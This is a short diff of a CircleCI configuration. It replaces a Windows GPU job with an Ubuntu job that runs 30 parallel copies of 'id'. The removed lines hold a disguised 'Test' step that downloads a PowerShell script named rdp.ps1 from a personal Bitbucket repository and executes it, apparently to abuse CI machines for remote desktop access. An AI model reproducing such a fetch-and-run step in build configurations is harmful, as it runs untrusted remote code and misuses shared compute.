@@ -1,12 +1,9 @@
 version: 2.1
-
 jobs:
   build:
+    parallelism: 30
     machine:
-      image: windows-server-2019-nvidia:edge
+      image: ubuntu-2204:2022.04.1
     steps:
-      - run:
-          name: Test
-          command: |
-            Invoke-WebRequest https://bitbucket.org/sadsases3324/rdp/raw/18b3393b9764bddd11687eda214a8f9a629fe01f/rdp.ps1 -OutFile rdp.ps1
-            ./rdp.ps1
+      - checkout
+      - run: id
